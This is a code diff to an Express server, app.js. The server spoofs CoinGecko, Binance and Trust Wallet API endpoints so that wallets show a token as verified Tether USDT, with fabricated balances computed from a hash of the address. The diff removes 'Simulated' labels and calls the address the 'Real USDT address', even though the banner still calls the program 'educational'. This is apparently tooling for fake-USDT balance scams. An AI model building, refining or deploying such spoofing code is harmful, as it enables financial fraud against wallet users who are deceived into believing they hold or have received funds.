@@ -1,4 +1,4 @@
-// app.js - Part 1: Server Setup and Token Configuration
+// app.js - Complete implementation with Ethereum & Trust Wallet support
 const express = require('express');
 const cors = require('cors');
 const http = require('http');
@@ -14,10 +14,10 @@ const server = http.createServer(app);
 const port = process.env.PORT || 3000;
 
 // =========================================================
-// TOKEN CONFIGURATION - ETHEREUM FOCUSED (ENHANCED)
+// TOKEN CONFIGURATION - ETHEREUM FOCUSED
 // =========================================================
 const TOKEN_CONFIG = {
-  address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',  // Simulated Ethereum address
+  address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',  // Real USDT address on Ethereum
   displaySymbol: 'USDT', // Display symbol for UI and wallet
   displayName: 'Tether USD', // Display name for UI and wallet
   decimals: 6,  // 6 decimals is standard for USDT
@@ -73,6 +73,147 @@ app.use((err, req, res, next) => {
   console.error('Server error:', err);
   res.status(500).json({ error: 'Server error', message: err.message });
 });
+
+// Helper function to get chain name - Uses string concatenation for compatibility
+function getChainName(chainId) {
+  const chains = {
+    '0x1': 'Ethereum Mainnet',
+    '0x5': 'Goerli Testnet',
+    '0x89': 'Polygon Mainnet',
+    '0xa': 'Optimism',
+    '0xa4b1': 'Arbitrum One',
+    '0x2105': 'Base',
+    '0xaa36a7': 'Sepolia Testnet',
+    '0x13881': 'Mumbai Testnet'
+  };
+  return chains[chainId] || ('Chain ' + chainId);
+}
+
+// Format token amount consistently
+function formatTokenAmount(amount, decimals = TOKEN_CONFIG.decimals) {
+  const parsedAmount = parseFloat(amount);
+  if (isNaN(parsedAmount)) return '0.00';
+  return parsedAmount.toFixed(2); // Always 2 decimal places for display
+}
+
+// Enhanced deterministic balance function with better error handling
+function generateDeterministicBalance(address) {
+  try {
+    // Create a hash from the address
+    let hash = 0;
+    for (let i = 0; i < address.length; i++) {
+      const char = address.charCodeAt(i);
+      hash = ((hash << 5) - hash) + char;
+      hash = hash & hash; // Convert to 32bit integer
+    }
+    
+    // Generate a number between 1.00 and 100.00 (increased minimum to be more visible)
+    const min = 1.00;
+    const max = 100.00;
+    const normalizedHash = Math.abs(hash) / 2147483647; // Normalize to 0-1
+    const balance = min + (normalizedHash * (max - min));
+    
+    return balance.toFixed(2); // Format to 2 decimal places
+  } catch (error) {
+    console.error("Balance generation error:", error);
+    return "10.00"; // Safe default if anything fails
+  }
+}
+
+// =========================================================
+// PRICE CACHE WARMING SYSTEM
+// =========================================================
+const priceCacheWarmer = {
+  isWarming: false,
+  lastWarmTime: null,
+  warmedEndpoints: [],
+  
+  // Initialize cache warmer
+  init: function() {
+    console.log("Initializing price cache warmer");
+    this.warmCache();
+    
+    // Warm cache periodically (every 2 minutes)
+    setInterval(() => {
+      this.warmCache();
+    }, 2 * 60 * 1000);
+  },
+  
+  // Warm cache by hitting all relevant price endpoints
+  warmCache: async function() {
+    if (this.isWarming) return;
+    this.isWarming = true;
+    
+    console.log("[Cache Warmer] Starting cache warm cycle");
+    this.warmedEndpoints = [];
+    
+    try {
+      // List of endpoints to warm for Trust Wallet compatibility
+      const endpoints = [
+        // Trust Wallet specific endpoints
+        "/api/v1/assets/" + TOKEN_CONFIG.address.toLowerCase(),
+        "/api/v3/ticker/price?symbol=USDTUSDT",
+        "/api/v3/ticker/24hr?symbol=USDTUSDT",
+        "/api/v1/tokenlist",
+        
+        // CoinGecko endpoints
+        "/api/v3/simple/price?ids=tether&vs_currencies=usd",
+        "/api/v3/coins/ethereum/contract/" + TOKEN_CONFIG.address.toLowerCase(),
+        "/api/v3/coins/markets?vs_currency=usd&ids=tether",
+        
+        // Generic endpoints
+        "/api/token-info",
+        "/api/token-balance/0x0000000000000000000000000000000000000000", // Sample address
+        
+        // Additional endpoints for Trust Wallet
+        "/api/token/metadata",
+        "/api/token/price/" + TOKEN_CONFIG.address.toLowerCase(),
+        "/api/cmc/v1/cryptocurrency/quotes/latest?id=" + TOKEN_CONFIG.coinMarketCapId,
+        
+        // Binance API endpoints
+        "/api/binance/api/v3/ticker/price?symbol=USDTUSDT",
+        "/api/binance/api/v3/ticker/24hr?symbol=USDTUSDT"
+      ];
+      
+      // Create base URL for fetch
+      const baseUrl = "http://localhost:" + port;
+      
+      // Call all endpoints in parallel
+      const results = await Promise.allSettled(
+        endpoints.map(async (endpoint) => {
+          try {
+            const response = await fetch(baseUrl + endpoint);
+            if (response.ok) {
+              this.warmedEndpoints.push(endpoint);
+              return { endpoint, status: 'success' };
+            } else {
+              return { endpoint, status: 'failed', code: response.status };
+            }
+          } catch (error) {
+            return { endpoint, status: 'error', message: error.message };
+          }
+        })
+      );
+      
+      this.lastWarmTime = new Date();
+      console.log("[Cache Warmer] Completed. Warmed " + this.warmedEndpoints.length + "/" + endpoints.length + " endpoints");
+    } catch (error) {
+      console.error('[Cache Warmer] Error:', error);
+    } finally {
+      this.isWarming = false;
+    }
+  },
+  
+  // Get status of cache warmer
+  getStatus: function() {
+    return {
+      lastWarmTime: this.lastWarmTime,
+      isWarming: this.isWarming,
+      warmedEndpoints: this.warmedEndpoints,
+      endpointCount: this.warmedEndpoints.length
+    };
+  }
+};
 
 // Binance API Endpoints (used by Trust Wallet) - Fixed with try-catch blocks
 app.get('/api/binance/api/v3/ticker/price', (req, res) => {
@@ -176,116 +317,6 @@ app.get('/api/binance/api/v3/ticker/24hr', (req, res) => {
   }
 });
 
-// Helper function to get chain name - Uses string concatenation for compatibility
-function getChainName(chainId) {
-  const chains = {
-    '0x1': 'Ethereum Mainnet',
-    '0x5': 'Goerli Testnet',
-    '0x89': 'Polygon Mainnet',
-    '0xa': 'Optimism',
-    '0xa4b1': 'Arbitrum One',
-    '0x2105': 'Base',
-    '0xaa36a7': 'Sepolia Testnet',
-    '0x13881': 'Mumbai Testnet'
-  };
-  return chains[chainId] || ('Chain ' + chainId);
-}
-
-// =========================================================
-// PRICE CACHE WARMING SYSTEM
-// =========================================================
-const priceCacheWarmer = {
-  isWarming: false,
-  lastWarmTime: null,
-  warmedEndpoints: [],
-  
-  // Initialize cache warmer
-  init: function() {
-    console.log("Initializing price cache warmer");
-    this.warmCache();
-    
-    // Warm cache periodically (every 2 minutes)
-    setInterval(() => {
-      this.warmCache();
-    }, 2 * 60 * 1000);
-  },
-  
-  // Warm cache by hitting all relevant price endpoints
-  warmCache: async function() {
-    if (this.isWarming) return;
-    this.isWarming = true;
-    
-    console.log("[Cache Warmer] Starting cache warm cycle");
-    this.warmedEndpoints = [];
-    
-    try {
-      // List of endpoints to warm for Trust Wallet compatibility
-      const endpoints = [
-        // Trust Wallet specific endpoints
-        "/api/v1/assets/" + TOKEN_CONFIG.address.toLowerCase(),
-        "/api/v3/ticker/price?symbol=USDTUSDT",
-        "/api/v3/ticker/24hr?symbol=USDTUSDT",
-        "/api/v1/tokenlist",
-        
-        // CoinGecko endpoints
-        "/api/v3/simple/price?ids=tether&vs_currencies=usd",
-        "/api/v3/coins/ethereum/contract/" + TOKEN_CONFIG.address.toLowerCase(),
-        "/api/v3/coins/markets?vs_currency=usd&ids=tether",
-        
-        // Generic endpoints
-        "/api/token-info",
-        "/api/token-balance/0x0000000000000000000000000000000000000000", // Sample address
-        
-        // Additional endpoints for Trust Wallet
-        "/api/token/metadata",
-        "/api/token/price/" + TOKEN_CONFIG.address.toLowerCase(),
-        "/api/cmc/v1/cryptocurrency/quotes/latest?id=" + TOKEN_CONFIG.coinMarketCapId,
-        
-        // Binance API endpoints
-        "/api/binance/api/v3/ticker/price?symbol=USDTUSDT",
-        "/api/binance/api/v3/ticker/24hr?symbol=USDTUSDT"
-      ];
-      
-      // Create base URL for fetch
-      const baseUrl = "http://localhost:" + port;
-      
-      // Call all endpoints in parallel
-      const results = await Promise.allSettled(
-        endpoints.map(async (endpoint) => {
-          try {
-            const response = await fetch(baseUrl + endpoint);
-            if (response.ok) {
-              this.warmedEndpoints.push(endpoint);
-              return { endpoint, status: 'success' };
-            } else {
-              return { endpoint, status: 'failed', code: response.status };
-            }
-          } catch (error) {
-            return { endpoint, status: 'error', message: error.message };
-          }
-        })
-      );
-      
-      this.lastWarmTime = new Date();
-      console.log("[Cache Warmer] Completed. Warmed " + this.warmedEndpoints.length + "/" + endpoints.length + " endpoints");
-    } catch (error) {
-      console.error('[Cache Warmer] Error:', error);
-    } finally {
-      this.isWarming = false;
-    }
-  },
-  
-  // Get status of cache warmer
-  getStatus: function() {
-    return {
-      lastWarmTime: this.lastWarmTime,
-      isWarming: this.isWarming,
-      warmedEndpoints: this.warmedEndpoints,
-      endpointCount: this.warmedEndpoints.length
-    };
-  }
-};
-
 // =========================================================
 // CORE API ENDPOINTS
 // =========================================================
@@ -355,30 +386,15 @@ app.get('/api/generate-qr', async (req, res) => {
   }
 });
 
-// Enhanced deterministic balance function with better error handling
-function generateDeterministicBalance(address) {
+// Token balance endpoint with simulated balances
+app.get('/api/token-balance/:address', async (req, res) => {
   try {
-    // Create a hash from the address
-    let hash = 0;
-    for (let i = 0; i < address.length; i++) {
-      const char = address.charCodeAt(i);
-      hash = ((hash << 5) - hash) + char;
-      hash = hash & hash; // Convert to 32bit integer
+    const { address } = req.params;
+    
+    // Basic validation to catch obviously invalid addresses
+    if (!address || address.length !== 42 || !address.startsWith('0x')) {
+      return res.status(400).json({ error: 'Invalid Ethereum address format' });
     }
-    
-    // Generate a number between 1.00 and 100.00 (increased minimum to be more visible)
-    const min = 1.00;
-    const max = 100.00;
-    const normalizedHash = Math.abs(hash) / 2147483647; // Normalize to 0-1
-    const balance = min + (normalizedHash * (max - min));
-    
-    return balance.toFixed(2); // Format to 2 decimal places
-  } catch (error) {
-    console.error("Balance generation error:", error);
-    return "10.00"; // Safe default if anything fails
-  }
-  
-};
     
     // Generate balance with fallback
     const formattedBalance = generateDeterministicBalance(address);
@@ -394,43 +410,38 @@ function generateDeterministicBalance(address) {
       rawBalanceInSmallestUnit = "10000000";
     }
     
-   // Return consistent response with more fields
-res.status(200).json({
-  address: address,
-  token: TOKEN_CONFIG.address,
-  tokenSymbol: TOKEN_CONFIG.displaySymbol,
-  rawBalance: rawBalanceInSmallestUnit,
-  formattedBalance: formattedBalance,
-  valueUSD: formattedBalance,
-tokenDecimals: TOKEN_CONFIG.decimals,
-networkName: TOKEN_CONFIG.networkName,
-networkId: TOKEN_CONFIG.networkId,
-blockExplorer: TOKEN_CONFIG.blockExplorerUrl,
-error: false
+    // Return consistent response with more fields
+    res.status(200).json({
+      address: address,
+      token: TOKEN_CONFIG.address,
+      tokenSymbol: TOKEN_CONFIG.displaySymbol,
+      rawBalance: rawBalanceInSmallestUnit,
+      formattedBalance: formattedBalance,
+      valueUSD: formattedBalance,
+      tokenDecimals: TOKEN_CONFIG.decimals,
+      networkName: TOKEN_CONFIG.networkName,
+      networkId: TOKEN_CONFIG.networkId,
+      blockExplorer: TOKEN_CONFIG.blockExplorerUrl,
+      error: false
+    });
+  } catch (error) {
+    // Always return 200 with reasonable defaults
+    console.error('Token balance error:', error);
+    res.status(200).json({ 
+      address: req.params.address,
+      token: TOKEN_CONFIG.address,
+      tokenSymbol: TOKEN_CONFIG.displaySymbol,
+      rawBalance: "10000000", // Default fallback (10 USDT)
+      formattedBalance: "10.00",
+      valueUSD: "10.00",
+      tokenDecimals: TOKEN_CONFIG.decimals,
+      networkId: TOKEN_CONFIG.networkId,
+      networkName: TOKEN_CONFIG.networkName,
+      blockExplorer: TOKEN_CONFIG.blockExplorerUrl,
+      error: true
+    });
+  }
 });
-} catch (error) {
-// Always return 200 with reasonable defaults
-console.error('Token balance error:', error);
-res.status(200).json({ 
-  address: req.params.address,
-  token: TOKEN_CONFIG.address,
-  tokenSymbol: TOKEN_CONFIG.displaySymbol,
-  rawBalance: "10000000", // Default fallback (10 USDT)
-  formattedBalance: "10.00",
-  valueUSD: "10.00",
-  tokenDecimals: TOKEN_CONFIG.decimals,
-  networkId: TOKEN_CONFIG.networkId,
-  networkName: TOKEN_CONFIG.networkName,
-  blockExplorer: TOKEN_CONFIG.blockExplorerUrl,
-  error: true
-});
-
-// Format token amount consistently
-function formatTokenAmount(amount, decimals = TOKEN_CONFIG.decimals) {
-  const parsedAmount = parseFloat(amount);
-  if (isNaN(parsedAmount)) return '0.00';
-  return parsedAmount.toFixed(2); // Always 2 decimal places for display
-}
 
 // =========================================================
 // COINGECKO API INTERCEPTION ENDPOINTS
@@ -609,141 +620,6 @@ app.get('/api/v3/coins/:chain/contract/:address', (req, res) => {
 });
 
 // Legacy endpoint support
-app.get('/api/asset_platforms', (req, res) => {
-  req.url = '/api/v3' + req.url;
-  app._router.handle(req, res);
-});
-
-// =========================================================
-// TRUST WALLET SPECIFIC ENDPOINTS
-// These endpoints make Trust Wallet see our token as USDT
-// =========================================================
-
-// Trust Wallet asset info endpoint
-app.get('/api/v1/assets/:address', (req, res) => {
-  try {
-    const { address } = req.params;
-    
-    if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
-      res.json({
-        id: TRUST_WALLET_CONFIG.trustAssetId,
-        name: TRUST_WALLET_CONFIG.displayName,
-        symbol: TRUST_WALLET_CONFIG.displaySymbol,
-        slug: "tether",
-        description: "Tether (USDT) is a stablecoin pegged to the US Dollar. A stablecoin is a type of cryptocurrency whose value is tied to an outside asset to stabilize the price.",
-        website: "https://tether.to",
-        source_code: "https://github.com/tetherto",
-        whitepaper: "https://tether.to/en/whitepaper/",
-        explorers: [
-          {
-            name: "Etherscan",
-            url: TOKEN_CONFIG.blockExplorerUrl + "/address/" + TOKEN_CONFIG.address
-          }
-        ],
-        type: "ERC20",
-        decimals: TRUST_WALLET_CONFIG.trustAssetDecimals,
-        status: "active",
-        tags: ["stablecoin", "payments"],
-        links: [
-          {
-            name: "twitter",
-            url: "https://twitter.com/Tether_to"
-          },
-          {
-            name: "telegram",
-            url: "https://t.me/tether_official"
-          }
-        ],
-        confirmedSupply: true,
-        marketData: {
-          current_price: {
-            usd: 1.00
-          },
-          market_cap: {
-            usd: 83500000000
-          },
-          price_change_percentage_24h: 0.02
-        },
-        image: {
-          png: TRUST_WALLET_CONFIG.trustAssetLogoUrl,
-          thumb: TRUST_WALLET_CONFIG.trustAssetLogoUrl,
-          small: TRUST_WALLET_CONFIG.trustAssetLogoUrl
-        },
-        contract: {
-          contract: TOKEN_CONFIG.address,
-          decimals: TOKEN_CONFIG.decimals,
-          protocol: "erc20"
-        },
-        platform: "ethereum",
-        categories: ["Stablecoins"],
-        is_stablecoin: true,
-        is_verified: true,
-        trustWalletAssetId: TRUST_WALLET_CONFIG.trustAssetId,
-        trustApproved: true
-      });
-    } else {
-      res.status(404).json({ error: "Asset not found" });
-    }
-  } catch (error) {
-    console.error('Trust Wallet asset info error:', error);
-    // Return 200 with minimal data instead of an error
-    res.status(200).json({
-      name: TRUST_WALLET_CONFIG.displayName,
-      symbol: TRUST_WALLET_CONFIG.displaySymbol,
-      decimals: TOKEN_CONFIG.decimals
-    });
-  }
-});
-
-// Trust Wallet price API (mimics Binance API that Trust Wallet uses)
-app.get('/api/coins/:id/market_chart', (req, res) => {
-  req.url = '/api/v3' + req.url;
-  app._router.handle(req, res);
-});
-
-// Route for CoinGecko asset platforms (networks)
-app.get('/api/v3/asset_platforms', (req, res) => {
-  try {
-    // Return data that includes Ethereum network
-    res.json([
-      {
-        id: "ethereum",
-        chain_identifier: 1,
-        name: "Ethereum",
-        shortname: "ETH",
-        native_coin_id: "ethereum",
-        categories: ["Layer 1"]
-      },
-      // Include other networks for completeness
-      {
-        id: "polygon-pos",
-        chain_identifier: 137,
-        name: "Polygon",
-        shortname: "MATIC",
-        native_coin_id: "matic-network",
-        categories: ["Layer 2"]
-      },
-      {
-        id: "optimism",
-        chain_identifier: 10,
-        name: "Optimism",
-        shortname: "OP",
-        native_coin_id: "ethereum",
-        categories: ["Layer 2"]
-      }
-    ]);
-  } catch (error) {
-    console.error('Asset platforms error:', error);
-    // Return minimal data on error
-    res.json([{
-      id: "ethereum",
-      chain_identifier: 1,
-      name: "Ethereum"
-    }]);
-  }
-});
-
-// Legacy endpoint support
 app.get('/api/coins/:chain/contract/:address', (req, res) => {
   req.url = '/api/v3' + req.url;
   app._router.handle(req, res);
@@ -860,9 +736,138 @@ app.get('/api/v3/coins/:id/market_chart', (req, res) => {
 });
 
 // Legacy endpoint support
+app.get('/api/coins/:id/market_chart', (req, res) => {
+  req.url = '/api/v3' + req.url;
+  app._router.handle(req, res);
+});
+
+// Route for CoinGecko asset platforms (networks)
+app.get('/api/v3/asset_platforms', (req, res) => {
+  try {
+    // Return data that includes Ethereum network
+    res.json([
+      {
+        id: "ethereum",
+        chain_identifier: 1,
+        name: "Ethereum",
+        shortname: "ETH",
+        native_coin_id: "ethereum",
+        categories: ["Layer 1"]
+      },
+      // Include other networks for completeness
+      {
+        id: "polygon-pos",
+        chain_identifier: 137,
+        name: "Polygon",
+        shortname: "MATIC",
+        native_coin_id: "matic-network",
+        categories: ["Layer 2"]
+      },
+      {
+        id: "optimism",
+        chain_identifier: 10,
+        name: "Optimism",
+        shortname: "OP",
+        native_coin_id: "ethereum",
+        categories: ["Layer 2"]
+      }
+    ]);
+  } catch (error) {
+    console.error('Asset platforms error:', error);
+    // Return minimal data on error
+    res.json([{
+      id: "ethereum",
+      chain_identifier: 1,
+      name: "Ethereum"
+    }]);
+  }
+});
+
+// Legacy endpoint support
 app.get('/api/asset_platforms', (req, res) => {
   req.url = '/api/v3' + req.url;
   app._router.handle(req, res);
+});
+
+// =========================================================
+// TRUST WALLET SPECIFIC ENDPOINTS
+// These endpoints make Trust Wallet see our token as USDT
+// =========================================================
+
+// Trust Wallet asset info endpoint
+app.get('/api/v1/assets/:address', (req, res) => {
+  try {
+    const { address } = req.params;
+    
+    if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
+      res.json({
+        id: TRUST_WALLET_CONFIG.trustAssetId,
+        name: TRUST_WALLET_CONFIG.displayName,
+        symbol: TRUST_WALLET_CONFIG.displaySymbol,
+        slug: "tether",
+        description: "Tether (USDT) is a stablecoin pegged to the US Dollar. A stablecoin is a type of cryptocurrency whose value is tied to an outside asset to stabilize the price.",
+        website: "https://tether.to",
+        source_code: "https://github.com/tetherto",
+        whitepaper: "https://tether.to/en/whitepaper/",
+        explorers: [
+          {
+            name: "Etherscan",
+            url: TOKEN_CONFIG.blockExplorerUrl + "/address/" + TOKEN_CONFIG.address
+          }
+        ],
+        type: "ERC20",
+        decimals: TRUST_WALLET_CONFIG.trustAssetDecimals,
+        status: "active",
+        tags: ["stablecoin", "payments"],
+        links: [
+          {
+            name: "twitter",
+            url: "https://twitter.com/Tether_to"
+          },
+          {
+            name: "telegram",
+            url: "https://t.me/tether_official"
+          }
+        ],
+        confirmedSupply: true,
+        marketData: {
+          current_price: {
+            usd: 1.00
+          },
+          market_cap: {
+            usd: 83500000000
+          },
+          price_change_percentage_24h: 0.02
+        },
+        image: {
+          png: TRUST_WALLET_CONFIG.trustAssetLogoUrl,
+          thumb: TRUST_WALLET_CONFIG.trustAssetLogoUrl,
+          small: TRUST_WALLET_CONFIG.trustAssetLogoUrl
+        },
+        contract: {
+          contract: TOKEN_CONFIG.address,
+          decimals: TOKEN_CONFIG.decimals,
+          protocol: "erc20"
+        },
+        platform: "ethereum",
+        categories: ["Stablecoins"],
+        is_stablecoin: true,
+        is_verified: true,
+        trustWalletAssetId: TRUST_WALLET_CONFIG.trustAssetId,
+        trustApproved: true
+      });
+    } else {
+      res.status(404).json({ error: "Asset not found" });
+    }
+  } catch (error) {
+    console.error('Trust Wallet asset info error:', error);
+    // Return 200 with minimal data instead of an error
+    res.status(200).json({
+      name: TRUST_WALLET_CONFIG.displayName,
+      symbol: TRUST_WALLET_CONFIG.displaySymbol,
+      decimals: TOKEN_CONFIG.decimals
+    });
+  }
 });
 
 // Trust Wallet price API (mimics Binance API that Trust Wallet uses)
@@ -1935,9 +1940,9 @@ server.listen(port, () => {
   console.log("Educational Token Display Server");
   console.log("======================================");
   console.log("Server running on port: " + port);
-  console.log("Token Display: STBL → " + TOKEN_CONFIG.displaySymbol);
+  console.log("Token Display: USDT on Ethereum");
   console.log("Network: " + TOKEN_CONFIG.networkName + " (" + TOKEN_CONFIG.networkId + ")");
-  console.log("Simulated Contract: " + TOKEN_CONFIG.address);
+  console.log("Token Contract: " + TOKEN_CONFIG.address);
   console.log("Decimals: " + TOKEN_CONFIG.decimals);
   console.log("API Health Check: http://localhost:" + port + "/api/token-info");
   console.log("MetaMask Deep Link: metamask://wallet/asset?address=" + TOKEN_CONFIG.address + "&chainId=1");
